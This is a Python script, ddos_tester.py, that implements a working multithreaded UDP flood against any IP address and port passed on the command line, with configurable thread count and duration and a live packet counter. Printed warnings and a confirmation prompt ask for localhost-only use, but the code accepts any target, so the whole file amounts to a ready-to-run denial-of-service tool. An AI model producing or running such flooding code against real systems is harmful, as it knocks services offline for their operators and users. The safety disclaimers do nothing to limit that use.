# ddos_tester.py

import socket
import threading
import time
import argparse
import random

# Global stop event to signal threads to stop
stop_event = threading.Event()
# Global packet counter and a lock to ensure thread-safe updates
packet_count = 0
lock = threading.Lock()

def udp_flood(target_ip, target_port):
    """
    Function to be executed by each thread.
    It continuously sends UDP packets to the specified target.
    """
    global packet_count
    
    # Create a UDP socket
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate a 1KB payload of random bytes
    payload = random._urandom(1024)
    
    # Loop until the main thread signals the stop_event
    while not stop_event.is_set():
        try:
            # Send the packet to the target IP and port
            udp_socket.sendto(payload, (target_ip, target_port))
            
            # Use a lock for thread-safe incrementing of the packet counter
            with lock:
                packet_count += 1
        except Exception as e:
            # Errors can occur if the network buffer gets overwhelmed; we can ignore them for this test.
            # print(f"Thread error: {e}")
            pass

def main():
    """
    Main function to parse arguments and manage the attack threads.
    """
    parser = argparse.ArgumentParser(
        description="UDP Flood DDoS Test Script for Controlled Environments.",
        epilog="Use responsibly and only on your own localhost for testing."
    )
    parser.add_argument("target_ip", help="The target IP address (e.g., 127.0.0.1)")
    parser.add_argument("target_port", type=int, help="The target port (e.g., 8080)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads to use (default: 50)")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Duration of the test in seconds (default: 10)")
    args = parser.parse_args()

    # --- SAFETY WARNING ---
    print("="*60)
    print("!!! WARNING: DDoS TESTING SCRIPT !!!")
    print("This script is for educational and testing purposes ONLY.")
    print("Use it exclusively in a controlled environment against your own localhost.")
    print("DO NOT use this against any public or private network you do not own.")
    print("Unauthorized use of this script can lead to legal consequences.")
    print("="*60)
    
    # Confirmation prompt before starting
    confirm = input(f"Are you sure you want to target {args.target_ip}:{args.target_port} for {args.duration} seconds? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Test cancelled.")
        return

    print(f"\nStarting UDP flood on {args.target_ip}:{args.target_port} with {args.threads} threads for {args.duration} seconds.")
    
    # Create and start the flooding threads
    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=udp_flood, args=(args.target_ip, args.target_port))
        threads.append(thread)
        thread.start()

    start_time = time.time()
    try:
        # Keep the main thread alive for the specified duration, providing feedback
        while time.time() - start_time < args.duration:
            with lock:
                current_count = packet_count
            # Use carriage return `\r` to update the line in place
            print(f"\rPackets sent: {current_count:,}", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user.")
    
    # After the duration, signal all threads to stop
    stop_event.set()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    end_time = time.time()
    total_time = end_time - start_time
    
    # Final report
    print("\n\n" + "-"*30)
    print("Test Finished")
    print("-" * 30)
    print(f"Total packets sent: {packet_count:,}")
    print(f"Total duration: {total_time:.2f} seconds")
    if total_time > 0:
        print(f"Average packet rate: {packet_count / total_time:,.2f} packets/sec")
    print("-" * 30)

if __name__ == "__main__":
    main()
